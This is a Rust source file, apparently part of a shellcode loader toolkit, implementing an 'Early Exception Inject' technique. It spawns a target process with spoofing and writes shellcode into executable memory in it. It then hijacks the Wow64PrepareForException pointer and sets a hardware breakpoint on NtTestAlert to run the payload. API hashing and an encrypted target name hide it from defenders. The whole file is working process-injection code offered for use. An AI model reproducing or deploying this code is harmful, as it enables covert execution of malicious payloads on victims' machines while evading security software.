use std::ffi::c_void;
use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT;
use crate::syscall::common::env::get_loaded_module_by_hash;
use crate::syscall::common::pe::get_export_by_hash;

mod wow64;
mod stub;

const CONTEXT_AMD64: u32 = 0x00100000;
const CONTEXT_DEBUG_REGISTERS: u32 = CONTEXT_AMD64 | 0x00000010;

const NTDLL_HASH: u32 = crate::dbj2_hash!(b"ntdll.dll");
const NT_PROTECT_HASH: u32 = crate::dbj2_hash!(b"NtProtectVirtualMemory");
const NT_TEST_ALERT_HASH: u32 = crate::dbj2_hash!(b"NtTestAlert");

#[cfg(feature = "run_early_exception_inject")]
pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), String> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Executing via Early Exception Inject...");
    
    let ntdll = get_loaded_module_by_hash(NTDLL_HASH).ok_or("Failed to get ntdll")?;
    let wow64_prepare_for_exception = wow64::return_wow64_function_pointer(ntdll as *mut u8).ok_or("Failed to find Wow64PrepareForException")?;
    
    use crate::utils::simple_decrypt;
    let target_program = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PROGRAM"));

    #[cfg(feature = "debug")]
    {
        crate::utils::print_message(&format!("[DEBUG] early_exception_inject target_program raw: '{}'", target_program));
        match crate::api::normalize_nt_path(target_program.as_str()) {
            Ok(p) => crate::utils::print_message(&format!("[DEBUG] early_exception_inject normalized nt path: '{}'", p)),
            Err(e) => crate::utils::print_message(&format!("[DEBUG] normalize_nt_path failed: {}", e)),
        }
    }

    let process_info = crate::api::create_process_with_spoofing(target_program.as_str(), true)?;

    // Allocate memory for shellcode
    use crate::api::PAGE_EXECUTE_READWRITE;
    let shellcode_addr = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, shellcode_len, PAGE_EXECUTE_READWRITE)?;

    // Allocate memory for stub
    let mut stub_data = stub::get_stub();
    let stub_size = stub_data.len();
    let stub_addr = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, stub_size, PAGE_EXECUTE_READWRITE)?;
    let nt_protect_addr = get_export_by_hash(ntdll, NT_PROTECT_HASH).ok_or("NtProtectVirtualMemory not found")?;
    
    // Patch stub
    stub_data[74..82].copy_from_slice(&(nt_protect_addr as usize).to_le_bytes());
    stub_data[10..18].copy_from_slice(&(wow64_prepare_for_exception as usize).to_le_bytes());
    stub_data[93..101].copy_from_slice(&(wow64_prepare_for_exception as usize).to_le_bytes());
    stub_data[131..139].copy_from_slice(&(shellcode_addr as usize).to_le_bytes());

    // Write shellcode
    let shellcode_slice = std::slice::from_raw_parts(shellcode_ptr as *const u8, shellcode_len);
    crate::api::write_virtual_memory(process_info.hProcess, shellcode_addr, shellcode_slice)?;

    // Write stub
    crate::api::write_virtual_memory(process_info.hProcess, stub_addr, &stub_data)?;

    // Overwrite Wow64PrepareForException pointer
    let stub_addr_bytes = (stub_addr as usize).to_le_bytes();
    crate::api::write_virtual_memory(process_info.hProcess, wow64_prepare_for_exception as usize, &stub_addr_bytes)?;

    // Trigger exception via HWBP
    let nt_test_alert_addr = get_export_by_hash(ntdll, NT_TEST_ALERT_HASH).ok_or("NtTestAlert not found")?;
    
    let mut context: CONTEXT = std::mem::zeroed();
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    context.Dr0 = nt_test_alert_addr as u64;
    context.Dr7 = 0x00000001;
    
    crate::api::set_context_thread(process_info.hThread, &context as *const _ as *const c_void)?;

    crate::api::resume_thread(process_info.hThread)?;

    Ok(())
}
